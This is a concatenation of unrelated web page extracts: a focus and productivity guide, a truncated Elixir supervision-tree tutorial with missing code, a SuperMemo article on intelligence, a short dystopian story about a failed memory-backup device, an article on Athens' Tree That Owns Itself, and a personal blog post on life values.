       <h4>Create an ambient visual reminder for WIGs</h4>
       <p>Once you have clear goals, you need to make them obvious to you every day.</p>
       <p>To do that, we recommend creating an ambient visual reminder.</p>
       <p>A post-it note written with a thick marker on your desk.<br>
       A big poster above your door.<br>
       A timeline on a whiteboard.</p>
       <p>Something in your&nbsp;<em>physical</em>&nbsp;(not digital) environment.</p>
       <p>The trouble with a digital environment is that if you have a goal written in a to-do app of some sort, once you close it it's out of sight out of mind. If you don't open the app in the morning, you don't get reminded of the goal.</p>
       <p><strong>Create a highly visual reminder for your goals and place it in your surroundings so that you see it every day. Every time you glance at it, it will remind you to focus.</strong></p>
       
       <h4>Strategic focus - summary</h4>
       <ol>
       <li><strong>Define what to focus on.</strong><br>
       Make a written list.</li>
       <li><strong>Select only the top-most items from that list - ideally 2 items.</strong><br>
       Decide to explicitly&nbsp;<em>not</em>&nbsp;focus on other, less important goals at the moment.</li>
       <li><strong>Phrase them in the following way: From X to Y by when.</strong></li>
       <li><strong>Place a visual reminder in your surroundings.</strong><br>
       Put it somewhere in your physical environment where it's impossible to miss.</li>

       </ol>
       <p>If you do this, you will become hyper-aware of when you're moving towards your most important goals, and when you're not. What you need to focus on will stay at the top of your mind, instead of being forgotten.</p>
       
       
       <h3>2. How to improve task focus</h3>
       <p>Once you know what to focus on, it's time to focus on it.</p>
       <p>As we mentioned before, ignoring irrelevant stimuli is not a passive process. It takes effort.</p>
       <p>It makes sense to divide improving concentration into 2 parts:</p>
       <ul>
       <li>Improve ignoring</li>
       <li>Improve concentration</li>

       </ul>
       <p>Let's get into it.</p>
       
       <h4>How to ignore better</h4>
       <p>To minimize the effort required to ignore irrelevant stimuli, either remove them if you can, or use something to make it easier to block out the noise.</p>
       <ul>
       <li><p><strong>Put on noise-canceling headphones.</strong><br>
       This is taking the&nbsp;<em>ignore the noise</em>&nbsp;literally. Background noises can disrupt our attention (especially true for people with ADD/ADHD). Whether it is your neighbors arguing or a&nbsp;<em>PING!</em>&nbsp;of a notification, if you can't hear them, you don't need to take the effort to filter them out.</p>
       </li>
       <li><p><strong>Find a quiet place to work.</strong><br>
       Sometimes even noise-canceling headphones aren't enough, in that case a public library or an empty class/conference room might do wonders. Even a different room can work.</p>
       </li>
       <li><p><strong>Declutter.</strong><br>
       Headphones will help with auditory clutter, but what about visual clutter?<br>
       If you have 50 post-its with ideas and to-do lists in sight, it'll take more effort to not glance at them. Remove them.<br>
       Same goes for 25 open browser tabs. Close them or go into fullscreen mode.</p>
       </li>
       <li><p><strong>Batch distracting activities.</strong><br>
       If you need to respond to emails or work requests as they come, learn to ignore them, if for but a moment.<br>
       Deal with emails once every 30 minutes, or once an hour, instead of checking it randomly whenever you get a tiny bit bored or stressed.<br>
       Minimize the number of switches between tasks.</p>
       </li>
       <li><p><strong>Minimize distractions before a work session.</strong></p>
       <p>The phone is a distraction machine. Sure, we can use it productively, but when it's sitting on our desks during work, it's a constant reminder that we could be doing something&nbsp;<em>fun</em>&nbsp;instead.<br>
       Here are our suggestions on minimizing digital distractions:</p>
       <ul>
       <li>Use the&nbsp;<strong>Rule of 3 Senses: hide your phone out of sight, reach, and hearing.</strong><br>
       Put your phone where you can't see, reach it, or hear it. A drawer or a backpack both work.</li>
       <li><strong>Block distracting sites on your computer.</strong><br>
       You can use&nbsp;<a target="_blank" href="https://www.deprocrastination.co/home">our extension</a>&nbsp;or some other extension that performs the same function - blocking distracting sites in your browser. When you don't have the option of opening a new YouTube tab and going down a rabbit hole, you can focus better.</li>

       </ul>
       </li>

       </ul>
       
       <h4>How to concentrate better</h4>
       <p>Now that we have less to ignore, how to really hone in on work?</p>
       <ul>
       <li><p><strong>Go…</strong></p></li></ul></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Tags: programming, elixir, supervisor, supervision tree</p></div><p data-v-d417aca0="">As developers, we always strive to offer our clients a high-quality service (or at least we should :) ). One of the most important features of high-quality service is its reliability. In other words, the service should rarely, if ever, be unavailable.</p><p data-v-d417aca0="">In the Elixir world, we can achieve this easily using a concept known as a supervision tree. Supervision tree is a structure of processes that allows us to build reliable, fault-tolerant and self-healing systems. This can make our application resistant to unexpected bugs that can creep up in the production. The kind of bugs that are really difficult to reproduce and that require specific state of the application to appear (google the term heisenbug). Supervision tree helps us in dealing with those kinds of bugs by simply restarting the part of the tree that's causing the problems. That way, we get to start off with a clean slate, and most of the times, that's enough to solve our issues.</p><p data-v-d417aca0="">So, how does Elixir make that possible?</p><p data-v-d417aca0="">First, let's take a look at how a supervision tree looks graphically.</p><p data-v-d417aca0=""><img src="https://kodius.com/images/blog/elixir-supervision-tree-complex.png" alt="complex tree" data-v-d417aca0=""></p><p data-v-d417aca0="">At its core, the supervision tree consists of two types of processes: workers and supervisors (imaginatively marked W and S, respectively).</p><p data-v-d417aca0="">Workers are simply processes which run some kind of logic. They are the meat of your application. Supervisors, on the other hand, are processes which supervise other processes, be it workers or other supervisors. This sounds like some kind of processeption, but at its base, it's not that complicated.</p><p data-v-d417aca0="">There are two main tasks a supervisor has: restarting its children processes in the desired way when they terminate (expectedly or unexpectedly), and terminating itself along with its children processes if it deems necessary, i.e. when there's something off with the state in its part of the application.</p><p data-v-d417aca0="">In simpler terms, workers run the domain code and if some error occurs and the worker crashes, or it finishes its work and “dies”, its supervisor restarts it. If crashing happens too often, the supervisor terminates the said process, along with the rest of its children and then terminates itself.</p><p data-v-d417aca0="">There are three available restart strategies:<br data-v-d417aca0="">- <code data-v-d417aca0="">:one_for_one</code> - the supervisor restarts just the process that terminated,<br data-v-d417aca0="">- <code data-v-d417aca0="">:one_for_all</code> - the supervisor restarts all of its children if any of its children processes terminates,<br data-v-d417aca0="">- <code data-v-d417aca0="">:rest_for_one</code> - the supervisor restarts the terminated process and the processes defined after the crashed one (I'll refer to this later, to make it more clear with an example).</p><p data-v-d417aca0="">If the restart strategy isn't enough to fix our application, self-termination kicks in. When we define a supervisor process, we can also define its restart tolerance, i.e. how many restarts of its children it will tolerate in certain amount of time before it decides to terminate itself and its children processes (default tolerance is total of 3 restarts in 5 seconds). That way we propagate process restart one level up, making the parent supervisor process restart our supervisor process, which, in turn, starts all of its children processes once again, and we're starting off with a clean slate.</p><p data-v-d417aca0="">Now, enough theory, let's put all this into practice!</p><h2 id="“simple-supervision-tree”" data-v-d417aca0="">Simple supervision tree</h2><p data-v-d417aca0="">Let's start off by making an extremely simple supervision tree, which will be made of one supervisor process and two of its children, which will be workers.</p><p data-v-d417aca0=""><img src="https://kodius.com/images/blog/elixir-supervision-tree-simple.png" alt="simple-tree" data-v-d417aca0=""></p><p data-v-d417aca0="">First, we'll define our supervisor process.</p><pre data-v-d417aca0=""><code data-v-d417aca0=""><span data-v-d417aca0=""><span data-v-d417aca0="">defmodule</span> <span data-v-d417aca0="">SimpleSupervisor</span></span> <span data-v-d417aca0="">do</span>

</code></pre><p data-v-d417aca0="">As you can see, it's quite simple. We have <code data-v-d417aca0="">start/0</code> function, which we'll call to start our tree.

</code></pre><p data-v-d417aca0="">There is a bit more going on here. First, let's discuss <code data-v-d417aca0="">child_spec/1</code> function. When we passed <code data-v-d417aca0="">ProcessA</code> as one of the children to <code data-v-d417aca0="">start_link/2</code> in <code data-v-d417aca0="">SimpleSupervisor</code>, <code data-v-d417aca0="">start_link/2</code> called <code data-v-d417aca0="">ProcessA.child_spec/1</code>, passing it <code data-v-d417aca0="">[]</code> as an argument. <code data-v-d417aca0="">child_spec/1</code> has to return a map with <code data-v-d417aca0="">:id</code> and <code data-v-d417aca0="">:start</code> as required keys. <code data-v-d417aca0="">:id</code> is used for identifying the child specification. <code data-v-d417aca0="">:start</code> contains a tuple <code data-v-d417aca0="">{Module, function, args}</code> which defines a function to call to start the process where <code data-v-d417aca0="">args</code> is a list of arguments (<code data-v-d417aca0="">Module.function(args)</code>).</p><p data-v-d417aca0=""><code data-v-d417aca0="">child_spec/1</code> is nicely explained at <a href="https://hexdocs.pm/elixir/Supervisor.html#module-child_spec-1" data-v-d417aca0="">https://hexdocs.pm/elixir/Supervisor.html#module-child_spec-1</a>, so we won't go into too much details.</p><p data-v-d417aca0="">In our <code data-v-d417aca0="">child_spec/1</code>, we defined <code data-v-d417aca0="">start_link/0</code> as the starting function. That function has to return <code data-v-d417aca0="">{:ok, pid}</code>, where <code data-v-d417aca0="">pid</code> will be used by the supervisor to track the process. In <code data-v-d417aca0="">start_link/0</code>, we just log to the console that we're starting the process and use Elixir's <code data-v-d417aca0="">Task</code> module to start a simple process. <code data-v-d417aca0="">Task.start_link/1</code> returns <code data-v-d417aca0="">{:ok, pid}</code>, which is just what we need.</p><p data-v-d417aca0="">We set the process to sleep for 1 000 000 milliseconds so that we have the time to play around with them, shutting them down and watching them restart. In real world applications, you would probably use <code data-v-d417aca0="">GenServer</code> or something similar here, i.e. some useful logic, but that's not the point of this post.

<h2><span id="What_is_intelligence.3F">What is intelligence?</span></h2>
<p>In humans, <b><a href="https://supermemo.guru/wiki/Intelligence" title="Intelligence">intelligence</a></b> is a measure of the ability to <a href="https://supermemo.guru/wiki/How_to_solve_any_problem%3F" title="How to solve any problem?">solve problems</a>.
</p>
<h2><span id="What_determines_intelligence.3F">What determines intelligence?</span></h2>
<p>Human intelligence depends on (1) innate qualities, (2) upbringing and (3) knowledge. 
</p><p><b>(1)</b> The <b>Genetic component</b> of intelligence is most apparent in the difference between humans and apes (see: <a href="https://supermemo.guru/wiki/Pleasure_of_communication" title="Pleasure of communication">Pleasure of communication</a>), however, it is far less prominent in a healthy human population. Some personality traits may have a greater impact on the ultimate intelligence than the actual innate brain processing power.
</p><p><b>(2)</b> <b>Upbringing</b> plays a crucial role in human intelligence. It should primarily be understood as the period when future intelligence can be undermined by disease, abuse, neglect and/or by limits on freedom. For healthy children, love and <a href="https://supermemo.guru/wiki/Optimization_of_behavioral_spaces_in_development" title="Optimization of behavioral spaces in development">free access to rich environments</a> is usually a sufficient condition for developing high intelligence.
</p><p><b>(3)</b> <b>Knowledge</b>: Given a basic genetic endowment and a healthy modern upbringing, most differences in adult human intelligence can be explained by learning and learning habits. There is also an important component of the interaction between the brain, the personality, and the environment. Some high-potential individuals get trapped in a set of <a href="https://supermemo.guru/wiki/Behavioral_system" title="Behavioral system">behavioral systems</a> that result in stagnation that may be hard to escape.
</p><p>Human intelligence has self-amplifying powers that may be undercut (1) internally by a pathology (or aging), or (2) externally by limits on freedom, esp. <a href="https://supermemo.guru/wiki/Free_learning" title="Free learning">freedom of learning</a> (e.g. <a href="https://supermemo.guru/wiki/Schooling" title="Schooling">schooling</a>).
</p>
<h2><span id="Universal_intelligence_is_elusive">Universal intelligence is elusive</span></h2>
<p>In healthy adults, intelligence is a domain-specific problem solving capacity. The concept of innate universal intelligence is a myth. A highly knowledgeable individual may show a spark of genius across many domains and come close to the sense of universal intelligence. We may use the term, a <b>Renaissance (wo)man</b> or a <b>polymath</b> in reference to such a person. Wide learning may provide an illusion of universal intelligence. This seemingly universal intelligence often runs in families. This may be explained by family culture, personality traits, and only to a minor degree by genes associated with the actual processing power of the brain.
</p><p>As much as there is no universal intelligence, there is no universal IQ test. All tests will depend on prior knowledge, interests, exposure, culture and other biases. Howard Gardner proposed the concept of <a href="https://en.wikipedia.org/wiki/Theory_of_multiple_intelligences">multiple intelligences</a>, where neurophysiological modalities may determine a preference for a specific type of cognitive processing. His thinking can be extended to all aspects of human knowledge where domain-specific training leads to the <a href="https://supermemo.guru/wiki/Emergence" title="Emergence">emergence</a> of domain-specific intelligence. In other words, there are as many intelligences as there are intelligent human brains. Correlations that lead to the concept of <a href="https://en.wikipedia.org/wiki/G_factor_(psychometrics)"><i>g factor</i></a> are all rooted in cross-domain transfers (e.g. in a set of positive feedback loops, learning may affect sleep, circulation, neurogenesis, mood, etc.).
</p><p>As much as there is no universal problem solving capacity, there is no universal problem solving test (see: <a href="https://supermemo.guru/wiki/PISA_fuels_the_education_arms_race" title="PISA fuels the education arms race">PISA refocuses on problem solving</a>). This extends to artificial intelligence. We cannot dismiss a state-of-the-art system on the grounds that <i>"all it can do is play Go"</i>. It is true that we still struggle to produce an artificially intelligent system that would show universal <a href="https://supermemo.guru/wiki/Learn_drive" title="Learn drive">learn drive</a> sufficient for the <a href="https://supermemo.guru/wiki/Emergence" title="Emergence">emergence</a> of highly applicable <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">abstract knowledge</a> when immersed in any domain. However, once we arrive there, we will still need to train the system in specific domains to call it truly intelligent.
</p>
<h2><span id="How_does_aging_affect_intelligence.3F">How does aging affect intelligence?</span></h2>
<p>In a healthy adult, domain-specific problem solving capacity will usually follow a curve in which there is an ascent in youth and a decline at older ages. The shape of that curve is determined by the balance of gains and losses. Gains are usually associated with learning, esp. learning via problem solving. Losses are mostly associated with health, esp. metal health, or neglect. As intelligence is a self-perpetuating quality, those who gain intelligence early may continue thriving into a very old age. On rare occasions, the effects of aging can be entirely compensated by lifelong learning, even in <a href="https://supermemo.guru/wiki/How_fast_does_memory_decline_with_age%3F" title="How fast does memory decline with age?">octogenarians and beyond</a>.
</p>
<h2><span id="Intelligence_prescription">Intelligence prescription</span></h2>
<p>The above reasoning leads to a simple formula for high intelligence:
</p>
<p>To maximize intelligence, we should focus on maximizing the acquisition of <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">high-quality knowledge</a></p>
<p>The term <i>high quality</i> stands here primarily for <a href="https://supermemo.guru/wiki/Coherence" title="Coherence">coherence</a> and <a href="https://supermemo.guru/wiki/Applicability" title="Applicability">applicability</a> (see: <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">Abstract knowledge</a>).
</p><p>The above formula is universal and hermetic. It dispenses of the problem of the starting point, which will often differ vastly between individuals. It carries an important optimistic message that accelerates progress: <b>there are few innate obstacles to high intelligence</b>.
</p>
<h2><span id="How_can_we_make_populations_more_intelligent.3F">How can we make populations more intelligent?</span></h2>
<p>Immense progress could be achieved if adults could eliminate only two factors: (1) <a href="https://supermemo.guru/wiki/Stress_resilience" title="Stress resilience">stress</a> and (2) <a href="https://supermemo.guru/wiki/Science_of_sleep" title="Science of sleep">sleep</a> problems. As personality traits are set, escaping from toxic human environments may also play a role for a large proportion of the population. Millions of people fail to live up to their potential due to being suppressed by their work environment or even family. Work environments must be friendly and families must thrive on love. Without those preconditions, achieving high intelligence is difficult. The balance of gains and losses may be negative or insufficiently positive. In addition, for a large proportion of children, the chances for growth are stunted by <a href="https://supermemo.guru/wiki/Schooling" title="Schooling">schooling</a>. Schools often promote bad learning habits, loss of self-reliance and unhealthy social environments. One of the best predictors of future high intelligence is a well-established and intense <a href="https://supermemo.guru/wiki/Passion_and_memory" title="Passion and memory">childhood passion</a>.
</p><p>There is nothing wrong with striving at genius. See my <a href="https://supermemo.guru/wiki/Genius_checklist" title="Genius checklist">Genius checklist</a> for some hints. In short, if you are unhesitantly involved in passionate problem solving associated with perpetual learning, you can rest assured: you are on the ascending curve towards high intelligence. All you need to remember is to shelter your efforts from possible disruptions to this self-empowering status quo.
</p>
<h2><span id="Intelligence_vs._knowledge">Intelligence vs. knowledge</span></h2>
<p>Stable knowledge and new knowledge play key roles in intelligence. For details see: <a href="https://supermemo.guru/wiki/Knowledge_in_creative_problem_solving" title="Knowledge in creative problem solving">Knowledge in creative problem solving</a>.

<blockquote><i><b>Figure:</b> Creative problem solving requires (1) vast expert knowledge of high <a href="https://supermemo.guru/wiki/Stability" title="Stability">stability</a>, and (2) rich new knowledge of high <a href="https://supermemo.guru/wiki/Retrievability" title="Retrievability">retrievability</a>. Vast stable knowledge makes it easy to solve algorithmic problems. Those problems can be solved at low energy expenditure with the help of <a href="https://supermemo.guru/wiki/Fast_thinking" title="Fast thinking">fast thinking</a>. Problems that require "thinking out of the box" rely on <a href="https://supermemo.guru/wiki/Creativity" title="Creativity">creativity</a>, i.e. association of remote ideas. Creativity and <a href="https://supermemo.guru/wiki/Learn_drive" title="Learn drive">learn drive</a> are powered by "hungry knowledge", i.e. fresh knowledge that can easily be molded and <a href="https://supermemo.guru/wiki/Generalization" title="Generalization">generalized</a> via <a href="https://supermemo.guru/wiki/Forgetting" title="Forgetting">forgetting</a>. This plasticity provides for good pattern matching in new learning and in creative problem solving</i></blockquote>

To think that others now thought I was a dangerous criminal as well was unsettling. The first person who died after I arrived at the ‘Correctional Institution’ was a 49-year-old Chinese-American named Li Wei. She had been there for 21 years for killing her teacher and would probably have been there for more but she had given up her right to appeal and had requested execution. After the initial shock had passed, I tried staying away from the other inmates. Forming attachments in a prison wasn’t a good idea. The way I saw it, they could be executed at any time.</p><p>“Count time. Turn the light on and stand at the door.” The loudspeakers came on as usual at 6 a.m. A few minutes later, breakfast trays were handed through the bars of the cell doors.</p><p>Today I was allowed in the unit’s law library. The two hours were never enough to gather enough information. Searching through the legal databases sitting in a cubicle using an old-fashioned computer from the year 2020 was enough to give anyone a headache and I was nowhere near prepared for my appeal hearings. When the two hours were up, I was led to my cell. What I wouldn’t do to get my old life back.</p><p>It was difficult to grasp how I had gone from being a bookworm holed in my apartment 24/7 to being accused of murdering a police officer. It would be years before I was proven innocent and another year before I was let out. To think I got here because of a glitch in the system’s face recognition system. They were willing to let a young innocent girl die rather than admit that there was something wrong with their technology. Having been here a month already and nowhere close to gathering enough information to prove my innocence, I had lost faith in God and the system. I had resigned myself to this cruel fate that God had handed me in a battered and dented platter.</p><p><em>Please let me find something to prove my innocence.</em></p><p>God must have heard my prayers because two days later members from the SCITECH arrived promptly at 11 in the afternoon.</p><p>Hearing the whispers from the others, I had already gathered that they were here to find volunteers to try out their newest technology because who better to try out your newest ‘technology’ on than the prisoners who had appealed for execution. Even if something went wrong, they would die anyway. If the technology worked, it’s all the better for them. We were nothing but <em>lab rats</em> to them. My lips curled in distaste. I wasn’t interested in being a lab rat. The technology wasn’t something you could rely on 100%. My current situation was a testament to that.</p><p>They were rounding the halls twisting their words to gather volunteers. I had lost interest in them and was playing chess by myself until they stood in front of my cell. There were three of them. The one in the middle seemed like he was the spokesperson. The other two were murmuring in the background.</p><p>“As you may have already gathered — ”</p><p>“Not interested.” I interrupted. He looked shocked as if a prisoner would dare to interrupt him while he was speaking. I couldn’t care less if he was offended.</p><p>“It could help you clear your name.”</p><p>I slowly turned my head to the side. It was one of the guys that had been murmuring in the background before. But his words caught my attention.</p><p>“Excuse me? Clear my name? Exactly what is it that you want to test?”</p><p>I should have known better than to meddle with technology after everything that happened. But proving my innocence by becoming a lab rat seemed like a sweet deal at the time. But I was wrong like I had been wrong about everything else in my life.</p><p>10 minutes.</p><p>That’s all the time I have. 10 minutes until I lose the remaining of my memories. Until I lose myself. Until I rid myself of this pain.</p><p>Until I die.</p><p>600 seconds.</p><p>599…598…597…</p><p>Memories were supposed to last forever. Even when the moment had long passed and the tears had long dried. Even when the jokes were long said and laughter had long faded. But fate had dealt me with a cruel hand. It had left me with a fragment of my soul.</p><p>555…554…553…</p><p>The technology was supposed to have worked. Instead, M-mry had backfired. The device itself was small and the process simple. Put on the small headset that came with a remote-like device. Type in the year and select what you wanted to backup. I had chosen high school because I didn’t have fond memories of that time. Instead of backing my memories up, it had deleted it from the main server. From my brain, it had stolen 4 years of my precious memories. Ones that I would never get back. Rafe had promised it would work but of course, he had lied. After he had seen the initial interest and curiosity in my eyes, he had used everything and said everything he could to get me to volunteer. And like a desperate idiot I was, I had believed every word he had said about how M-mry would free me by proving my innocence. I could remember every word he had said he was watching me with his chips blue eyes unwaveringly whenever he spoke.</p><p>“<em>The technology is new and it’s the prototype but we are sure that it works. Simply put, it’s a way to back up your memory. If it works, your ideas would not be lost even when you died. If you suddenly had Alzheimer’s disease, then you would still have a way to access your memories. Hypothetically, M-mry could prove your innocence by looking through your memories.</em>”</p><p>And when I had been unsure and close to backing out, he had used the one thing that was most important to me: My family.</p><p>“<em>M-mry is your only hope of proving your innocence. If it works, you will able to leave and see your family whenever you want. You could hug them and live freely. Be able to marry and have kids one day. Otherwise, who knows, maybe even in 20 years you will still not have proved your innocence.</em>”</p><p>That had been enough for me to sign my name on the thick document that protected SCITECH in case something did go wrong. And something went wrong indeed. Not only had I lost my memories of high school but now I had no way of getting them back.</p><p>480…479…478…</p><p>I didn’t think the memories I thought useless and unimportant when forgotten would feel as if I had lost a piece of my soul.</p><p>460…459…458…</p><p>Two weeks ago I gave up my right to appeal and asked for my execution. The new memories living in this prison would never replace the old memories and I was never going to get out of here even if I stayed here 40 years being on my best behavior.</p><p>355…354…353…</p><p>I never thought I would end up here.</p><p>250…249…248..</p><p>With the barest of memories.</p><p>110…109…108..</p><p>I thought that when I died, I would at least die as myself.</p><p>30…29…28…</p><p>I didn’t think I would die a shadow of my former self.</p><p>10…9…8…</p><p>I didn’t think I would die, a stranger.</p><p>3…</p><hr><p><em>Edited by <a href="https://instagram.com/cherrywine_stains" title="Mrk (cherrywine_stains) Instagram Profile" rel="nofollow">cherrywine_stains</a></em></p></div></div>]]>

		<p>No matter how famous or how ancient, all trees are ultimately owned by someone. It could be a government, a trust, or even just an individual caretaker. However, one white oak tree in Athens, Georgia was reportedly so beloved by its owner that upon his death, he gave the tree ownership of itself in his will.<span id="more-2706"></span></p>
<h2>The Legend of the Tree That Owns Itself</h2>
<p>The legend goes that a particularly large and beautiful white oak played a special role in the childhood of its owner, Colonel William Henry Jackson. When he died some time between 1820 and 1832, he deeded the tree and the soil around it to the tree itself. Here is the reported text of his will:</p>
<blockquote><p>I, W. H. Jackson, of the county of Clarke, of the one part, and the oak tree&nbsp;… of the county of Clarke, of the other part: Witnesseth, That the said W. H. Jackson for and in consideration of the great affection which he bears said tree, and his great desire to see it protected has conveyed, and by these presents do convey unto the said oak tree entire possession of itself and of all land within eight feet [2.4 m] of it on all sides.</p></blockquote>

<p>After that, the tree become known as the Tree that Owns Itself. However, there are a number of problems with the story’s validity. It originally ran as a front page story in the <em>Athens Banner Weekly</em> on August 12, 1890. That’s some 60 years after the supposed transaction took place, and there are no indications that anything special had happened to the tree before that (although it was known as Jackson’s Tree).</p>
<p>On top of that, the only witness to the will itself is the author of the article, and no one has been able to confirm that the statement above was ever made. However, the story became so popular that no one dared doubt the tree’s self-ownership. Effectively, the tree owned itself because everyone said it did.</p>
<p>Legally, of course, the tree isn’t able to own itself regardless of Jackson’s wishes. In fact, careful examination of property lines reveals that the tree isn’t even on his property. It’s officially part of the street (since it’s part of a median in the middle of the street), so its care falls to local authorities.</p>
<p>However, the tree is such a well respected landmark in the city that the Athens-Clarke County government has declared that in spite of the actual legality, the tree owns itself. Because they said so.</p>

<h2>Can a tree have rights?</h2>
<p>It might seem strange that a tree can own anything, let alone itself, but there is actually some legal precedent. Although they usually take a back seat to animal rights, plant rights have been discussed in several countries around the world.</p>
<p>In the Netherlands, a party called <a href="https://in.reuters.com/article/us-dutch-election-plants/plant-rights-party-to-contest-next-dutch-election-idINTRE62S2HA20100329">the Party for the Plants</a> was created to try to snag a few seats in the 2010 parliamentary elections. Although they weren’t particularly successful, their platform focused exclusively on promoting biodiversity and protecting plants from being harvested for biofuels.</p>
<p>More success has been found in New Zealand, where for the first time anywhere a forest was granted legal personhood and ownership of itself. The&nbsp;Te Urewera Act of 2014 changed the legal status of Te Urewera, a forest sacred to the Maori people, from a Natural Park into <a href="http://maorilawreview.co.nz/2014/10/tuhoe-crown-settlement-te-urewera-act-2014/">its own legal entity</a>.</p>

<p>Obviously the forest can’t speak for itself, so a board was set up “to act on behalf of, and in the name of, Te Urewera”. In March 2017 a second act was passed granting similar rights to the Whanganui River, since the local Maori tribe consider the river itself to be their ancestor.</p>
<p>Although it doesn’t go as far as giving trees and other plants ownership of themselves, the Clean Water Act of 1972 in the United States effectively grants them some rights. Under the ‘natural resource damage’ provisions of the law, trees and other resources have some basic rights. It’s the government, however, that’s entrusted with protecting those rights, although any money earned through litigation must be spent on the resource itself. Essentially, the money <em>belongs</em> to the resource.</p>
<h2>The Son of The Tree That Owns Itself</h2>
<p>The Tree That Owns Itself might have been granted semi-legal status in Athens-Clarke County, but that didn’t protect it from the whims of Mother Nature. It was heavily damaged in an ice storm in 1907, and eventually fell down in 1942. Many suspected that the tree had died long before falling.</p>
<p>But if the tree owned land, surely it must pass on to its next of kin. A tree grown from an acorn of the Tree That Owns Itself was selected as the heir, an transplanted into its new home in 1946. It also inherited the name, although it’s also referred to as the Son of the Tree That Owns Itself.</p>

<p>It’s now been more than 70 years since the tree moved in to the quiet residential neighborhood on Finley Street, and it appears to be doing well. Despite its unknown legal status, the legend lives on with a plaque commemorating the words that started it all. Slightly edited to be more intelligible to modern readers, it reads:</p>
<blockquote><p>For and in consideration of the great love I bear this tree and the and the great desire I have for its protection for all time, I convey entire possession of itself and all land within eight feed of the tree on all sides<br>
-William M Jackson</p></blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Last friday added another count to the yearly event we celebrate as “birthday”. I can barely remember my last birthday, I’m not a big birthday celebration person. I think every day can be a celebration if you choose it to be and a yearly event is not sufficient reason to treat yourself.<br></p><p>The passage of time seems to have changed over the years. Things move by at light speed, and if I blink I miss it. It doesn’t feel like a lot happened, and yet if I sit down and think about my last 1 year, a LOT has happened.</p><p>As I was reminiscing, I went beyond the last 1 year and thought generally of the value system that governs my life. These things come “obviously” to me and they’ve made my life better. I hope these values can serve you as well.</p><h3>1. Fixed vs Growth mindset</h3><p>If you’re anything like me from a few years ago, whenever someone would tell you a way to improve yourself or your life, your default reaction would be “yeah yeah but my life is hard I have X Y and Z reasons why I cannot do something about it”. </p><p>That’s fixed mindset. It’s when your mind operates under the base assumption that you, your situation, your surroundings, and your abilities, everything is static and fixed.</p><p>On the opposite end of the same spectrum is Growth mindset. Here, your mind knows and believes that everything is a work in progress, everything can be changed, and the path to changing something about your life that you don’t completely like is a path of fulfilment, not pain that you want to ignore.</p><p>A fixed mindset plateaus. A person with growth mindset improves and grows, a tiny bit, everyday and forever. </p><h3>2. Complaining drags you down, think problem-solutions instead</h3><p>I could complain about all the problems in my life, or I could list them down, write their probable cause, probable solutions, and the gaps in my knowledge that I need to fill with research to better understand the problem and find better solutions.</p><p>The energy that is used in complaining can be applied towards finding solutions. Not only do you not feel like shit, solving a problem is a positive experience and gives you the sense of control over your life vs submitting to “my life is so hard and the universe is out to get me”.</p><p>Sankalp was watching Mirzapur and shared this with me last night - </p><p><em>“I was watching Mirzapur today. There was a scene where the dons primary gun factory is burnt down to the ground by his rival. </em></p><p><em>He arrives at the scene, calmly guages the situation, then calls the CM who is one of his allies and tells him to release a press statement that the govt has tracked down a gun factory run by a criminal org, burnt it and put all the perpetrators in jail thereby making the state a safer place for everyone and uplift the party's image.”</em><br></p><h3>3. 0 or 1, choices are binary</h3><p>Most of the things in life are an either or. You either got up early today, or you didn’t. You either hit the gym, or you didn’t. </p><p>You could spend a lot of time in analysis of the gray area in between, but it’s a wasted effort on aspects of your life that operate like a transistor.It’s either 0 or 1, switched off or on.</p><p>Identify binary choices in your life and make them swiftly.<br></p><h3>4. Everything is on a spectrum</h3><p>At the same time, a lot of things in life are indeed in the gray area. These don’t have easy choices with clear outcomes, and yet you have to identify the spectrum and decide where you want to be on it in order to move ahead.</p><p>Hitting the gym is binary, how intensely you work out is on a spectrum.</p><p>Choosing to start a business is binary, how risky a path you pick lies on a spectrum.<br></p><h3>5. via negativa. Addition by subtraction</h3><p>The solution to most problems is not to add something, but to remove.</p><p>Not able to lose weight? You can exercise more, or you could eat less. You don’t need to add a night time meditation routine, you only need to remove your laptop and phone from the room.</p><p>A lot of pain in life can be prevented by “avoiding” doing things.<br></p><h3>6. Inversion, or how not to do</h3><p>Here’s a simple mental model that can make your life easier to navigate. Instead of looking for “how to be a good boss”, invert the question. </p><p>Identify instead the reasons that come up when you research “how to be a bad boss”. Apply via negativa, by avoiding the attributes of a bad boss you already become a good one. </p><p>I did the same when I had taken up my last PM job, by making a list of “how to be a bad product manager” and then avoiding those things. </p><p>Sankalp and I did the same when we were hiring by researching “mistakes to avoid when hiring”.<br></p><h3>7. Common sense is not common practice</h3><p>You might think something is obvious and also common sense, but I’ve learnt that there’s a reason many things are tagged as “common sense”. The phrase is an attribute that is desirable, but not necessarily literal. </p><p>Everyone knows eating greasy food in the long term will cause heart disease. Or not hitting the gym or exercising will make your body old and creaky and unfit. It’s common sense. But, not common practice.</p><p>The most important things in life are the simple and obvious ones. And yet they are the hardest to keep following day in and day out. <br></p><h3>8. Time and energy are finite resources</h3><p>The only finite resource in your life is time and energy. And every day, you have a finite amount available to you to apply to various things. Choose carefully.<br></p><h3>9. Velocity, not speed</h3><p>I refer to this over the more commonly referred hard work vs smart work analogy.</p><p>You could be running at a 100 miles/hour but getting no where if you’re moving in circles. Speed. </p><p>Your direction, where you are headed, is more important. Only by moving in the right direction do you make real progress. Velocity.<br></p><h3>10. Treat others the way you would want to be treated</h3><p>Another of the common sense not common practice terms. It’s easy to complain about others when they treat you unfairly. Yet when the power dynamics are reversed, people often do the same treatment to others.</p><p>The real test is how you treat others when you are in a position of power.<br></p><h3>11. People don’t know what they really want</h3><p>Nobody really does. The pursuit of meaning can end with the sharp knife of nihilism. There is no meaning or purpose in life.</p><p>But while having these thoughts are crucial to self-discovery, they aren’t helpful to fixate upon.</p><p>So people create meaning, direction, structures around their life to add meaning and purpose.</p><p>Which is why I think nobody really knows what they want. It’s all made up anyway.<br></p><h3>12. Your health can’t wait</h3><p>The truth is, every day our bodies are getting slightly older.</p><p>And after 25 things start moving faster. I bet they move even faster after 30 or later. Save yourself the trouble and maintain your body from before.</p><p>It makes it that much easier to get out of bed every day, have the energy to do all the things you want during the day, and just generally feel good.<br></p><h3>13. What you eat is what your body becomes</h3><p>The food you eat literally becomes molecules in your body.</p><p>One of the simplest 